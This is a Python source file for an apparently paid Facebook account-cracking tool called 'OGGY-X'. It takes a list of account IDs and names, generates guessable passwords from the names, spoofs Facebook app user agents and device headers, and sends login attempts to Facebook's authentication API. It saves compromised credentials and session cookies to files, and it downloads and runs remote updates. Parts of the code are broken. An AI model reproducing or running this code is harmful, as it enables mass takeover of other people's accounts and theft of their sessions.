import os
import json
import urllib.request
from datetime import datetime
import time
import random
import re
import sys
import string
import subprocess
from concurrent.futures import ThreadPoolExecutor as tpe
from concurrent.futures import ThreadPoolExecutor
import uuid
import requests
idss = []
pp = []
oku = []
cpu = []
l = []
idx = {}
loop = 0
approval_url = 'https://raw.githubusercontent.com/SKBER-CYBER/OGGY-X/main/App.json'
tool_url = 'https://raw.githubusercontent.com/SKBER-CYBER/OGGY-X/main/OGGY-X.py'
version_url = 'https://raw.githubusercontent.com/SKBER-CYBER/OGGY-X/main/Version.txtt'
local_filename = 'OGGY-X'
current_version = '1.5'
BB = '\x1b[34;1m'
A = '\x1b[1;97m'
R = '\x1b[38;5;196m'
Y = '\x1b[1;33m'
G = '\x1b[38;5;46m'
B = '\x1b[38;5;46m'
G1 = '\x1b[38;5;48m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\x1b[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'

def load_approvals():
    try:
        response = urllib.request.urlopen(approval_url)
        data = json.loads(response.read().decode())
        return data.get('keys', None)
    except Exception as e:
        print(f'\x1b[1;97m[\x1b[1;32m+\x1b[1;97m] \x1b[1;32mError loading approval list: {e}')
        sys.exit()

from datetime import datetime

def verify_key(key, approvals):
    if key in approvals:
        expiry_str = approvals[key]['expiry']
        expiry_date = datetime.strptime(expiry_str, '%Y-%m-%d').date()
        today = datetime.today().date()
        if today <= expiry_date:
            return True, approvals[key]
    return False, {}

def check_version():
    try:
        with urllib.request.urlopen(version_url) as response:
            latest_version = response.read().decode().strip()
            if latest_version != current_version:
                print(f"\n[!] New version available: {latest_version}")
                update = input("[?] Do you want to update? (y/n): ")
                if update.lower() == 'y':
                    auto_update()
    except Exception as e:
        print("\x1b[1;97m[\x1b[1;32m+\x1b[1;97m] \x1b[1;32mCould not check for update:", e)

def auto_update():
    try:
        print('\n[•] Downloading latest version...')
        urllib.request.urlretrieve(tool_url, local_filename)
        print('\x1b[1;92m[✓] Tool successfully updated!\x1b[0m')
        print('\x1b[1;97m[\x1b[1;32m+\x1b[1;97m] \x1b[1;32mRestarting tool...\n')
        os.system('python ' + local_filename)
        sys.exit()
    except Exception as e:
        print('\x1b[1;91m[×] Update failed:\x1b[0m', e)


def ua():
    devices = [
        'SM-G991B', 'SM-A715F', 'Redmi Note 11', 'M2006C3MII', 'Infinix X688C',
        'CPH1909', 'V2027', 'RMX1821', 'SM-A525F', 'SM-M336BU'
    ]
    brands = [
        'Samsung', 'Xiaomi', 'Realme', 'Vivo', 'Infinix', 'Oppo', 'OnePlus', 'Nokia'
    ]
    android_versions = ['10', '11', '12', '13', '14', '15']
    langs = ['en_US', 'en_GB', 'id_ID', 'bn_BD', 'hi_IN', 'pt_BR', 'tr_TR']
    FBCR = ['Grameenphone', 'Telenor', 'Robi', 'Airtel', 'Jio', 'Idea']
    FBOP = [1, 2]
    fb_versions = []
    for _ in range(10):
        fb_version = (
            f"{random.randint(430, 499)}.0.0."
            f"{random.randint(10, 99)}."
            f"{random.randint(100, 150)}"
        )
        fb_versions.append(fb_version)
    device = random.choice(devices)
    brand = random.choice(brands)
    android = random.choice(android_versions)
    chrome_ver = (
        f"{random.randint(110, 123)}.0."
        f"{random.randint(5000, 5999)}."
        f"{random.randint(10, 150)}"
    )
    fb_version = random.choice(fb_versions)
    lang = random.choice(langs)
    fbcr = random.choice(FBCR)
    fbop = random.choice(FBOP)
    ua_string = (
        f"Mozilla/5.0 (Linux; Android {android}; {device} Build/{brand}; wv) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_ver} "
        f"Mobile Safari/537.36 [FBAN/FB4A;FBAV/{fb_version};"
        f"FBPN=com.facebook.katana;FBLC={lang};"
        f"FBBV={random.randint(100000000, 999999999)};"
        f"FBCR/{fbcr};FBOP/{fbop}]"
    )
    return ua_string

def clear():
    os.system('clear')
    banner()

def linex():
    print(A + '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def banner():
    os.system('clear')
    print('\033[1;92m')
    print('   ' + G + ' ▗▖  ▗▖▗▄▄▖      ▗▄▖  ▗▄▄▖ ▗▄▄▖▗▖  ▗▖')
    print(G + '    ▐▛▚▞▜▌▐▌ ▐▌    ▐▌ ▐▌▐▌   ▐▌    ▝▚▞▘ ')
    print('  ' + G + '  ▐▌  ▐▌▐▛▀▚▖    ▐▌ ▐▌▐▌▝▜▌▐▌▝▜▌  ▐▌  ')
    print(' ' + G + '   ▐▌  ▐▌▐▌ ▐▌    ▝▚▄▞▘▝▚▄▞▘▝▚▄▞▘  ▐')
    print(A + '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('\033[1;97m[\033[1;32m+\033[1;97m] \033[1;32mOWNER      ' + A + ':' + G + ' MD JAHID HASAN')
    print('\033[1;97m[\033[1;32m+\033[1;97m] \033[1;32mTOOL       ' + A + ':' + G + ' FILE ' + BB + '/OR' + G + ' RANDOM')
    print('\033[1;97m[\033[1;32m+\033[1;97m] \033[1;32mVERSION    ' + A + ':' + G, current_version)
    print('\033[1;97m[\033[1;32m+\033[1;97m] \033[1;32mSTATUS     ' + A + ':' + G + ' PREMIUM')
    print(A + '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def show_menu(user_info):
    banner()
    print('\x1b[1;97m[\x1b[1;32m+\x1b[1;97m] \x1b[1;32mTOOL ACCESS GRANTED!')
    print('\x1b[1;97m[\x1b[1;32m+\x1b[1;97m] \x1b[1;32mKEY EXPIRY DATE : ' + str(R) + str(user_info['expiry']))
    print('\x1b[1;97m[\x1b[1;32m+\x1b[1;97m] \x1b[1;32mJOINED ON : ' + str(user_info['joined']))
    linex()
    print('\x1b[1;97m[\x1b[1;32m1\x1b[1;97m] \x1b[1;32mSTART TOOL')
    print('\x1b[1;97m[\x1b[1;32m2\x1b[1;97m] \x1b[1;32mUPDATE TOOL')
    print('\x1b[1;97m[\x1b[1;32m3\x1b[1;97m] \x1b[1;32mEXIT')
    linex()
    choice = input('\x1b[1;97m[\x1b[1;97m≈\x1b[1;97m] \x1b[1;32mCHOICE ' + str(A) + ':' + str(G) + ' ')
    if choice == '1':
        file()
    elif choice == '2':
        auto_update()
    elif choice == '0' or choice == '3':
        print('Goodbye!')
        exit()
    else:
        print('Invalid input.')
        exit()

def main():
    banner()
    key = input('\x1b[1;97m[\x1b[1;32m+\x1b[1;97m] \x1b[1;32mENTER YOUR APPROVED KEY : ')
    approvals = load_approvals()
    valid, user_info = verify_key(key, approvals)
    if valid:
        show_menu(user_info)
    else:
        print('\n\x1b[1;91m[×] INVALID OR EXPIRED KEY!\x1b[0m')
        exit()
        
def file():
    try:
        os.system('clear')
        banner()
        file_name = input('\x1b[1;97m[\x1b[1;32m+\x1b[1;97m] \x1b[1;32mENTER FILE: ')
        with open(file_name, 'r') as f:
            for x in f.readlines():
                idx.append(x.strip())
        method()
        exit()
    except Exception:
        print('\x1b[1;97m[\x1b[1;32m+\x1b[1;97m] \x1b[1;32mFILE NOT FOUND')
        show_menu()

def method():
    pp = []
    clear()
    lp = input(f"\033[1;97m[\033[1;97m≈\033[1;97m] {A}LIMIT PASSWORDS {G}:{G} ")
    if lp.isnumeric():
        pp = []
        clear()
        ex = "firstlast first123 last123"
        print(f"\033[1;97m[\033[1;97m{G}+{G}]\033[1;32m firstlast first123 last123 (ETC)")
        linex()
        for x in range(int(lp)):
            pp.append(input(f"\033[1;97m[\033[1;97m≈\033[1;97m] {A}PASSWORD {G}:{G} "))
    else:
        print(oo("!") + "Numeric Only")
        time.sleep(0.8)
        main_menu()
    clear()
    ip = requests.get("https://api.ipify.org").text
    print(f"\033[1;97m[\033[1;97m{G}+{G}]\033[1;32m TOTAL ACCOUNTS FOR CRACK {A}:{G} {len(idx)}")
    print(f"\033[1;97m[\033[1;97m{G}+{G}]\033[1;32m DONT USE AIRPLANE MODE")
    linex()

def start(user):
    r = requests.Session()
    user = user.strip()
    acc, name = user.split('|')
    first = name.rsplit(' ', 1)[0]
    last = name.rsplit(' ', 1)[1]
    pers = str(int(int(loop) / int(len(idx)) * 100)[:4]
    sys.stdout.write(f"\r{A}[{G}+{A}]{A}[{G}MR-OGGY{A}]{G}+{A} [G{loop}A]{G}+{A} [GOK-{len(oku)}A]\r")
    sys.stdout.flush()
    loop += 1
    for pswd in pp:
        heads = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; moto e5 plus Build/OPPS27.91-179-8-16) [FBAN/FB4A;FBAV/287.0.0.50.119;FBPN/com.facebook.katana;FBLC/es_MX;FBBV/243660864;FBCR/null;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/0;]'
        pswd = pp.replace('first', first.lower()).replace('First', first).replace('last', last.lower()).replace('Last', last).replace('Name', name).replace('name', name.lower())
        header = {
            'Content-Type': 'application/x-www-form-accencoded',
            'Host': 'graph.facebook.com',
            'User-Agent': ua(),
            'X-FB-Net-HNI': '45204',
            'X-FB-SIM-HNI': '45201',
            'X-FB-Connection-Type': 'unknown',
            'X-Tigon-Is-Retry': 'False',
            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'x-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'Accept-Encoding': 'gzip, deflate',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
            'Connection': 'Keep-Alive'
        }
        data = {
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password',
            'error_detail_type': 'button_with_disabled',
            'source': 'device_based_login',
            'email': acc,
            'password': pswd,
            'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
            'generate_session_cookies': '1',
            'meta_inf_fbmeta': '',
            'advertiser_id': str(uuid.uuid4()),
            'currently_logged_in_userid': '0',
            'locale': 'en_GB',
            'client_country_code': 'GB',
            'method': 'auth.login',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            'api_key': '882a8490361da98702bf97a021ddc14d'
        }
        response = r.post('https://b-api.facebook.com/method/auth.login',data=data,headers=header,allow_redirects=False).text
        if 'session_key' in response:
            oku.append(acc)
            cookie = f"sb={''.join(random.choices(string.ascii_letters + string.digits + '_', k=24))};" + ';'.join(c['name'] + '=' + c['value'] for c in json.loads(response)['session_cookies'])
            print(f"{A}[{G}OGGY-OK{G}] {acc} | {pswd}")
            print(f"{A}[{G}Cookie{A}]{G} {cookie}")
            with open('/sdcard/OGGY-OK.txt', 'a') as f:
                f.write(f"{acc}|{pswd}\n")
        elif 'User must verify their account' in response:
            cpu.append(acc)
            print(f"{R}[OGGY-CP] {acc} | {pswd}")
            with open('/sdcard/OGGY-CP.txt', 'a') as f:
                f.write(f"{acc}|{pswd}\n")
    except Exception as e:
        time.sleep(10)
        
if __name__ == "__main__":
    main()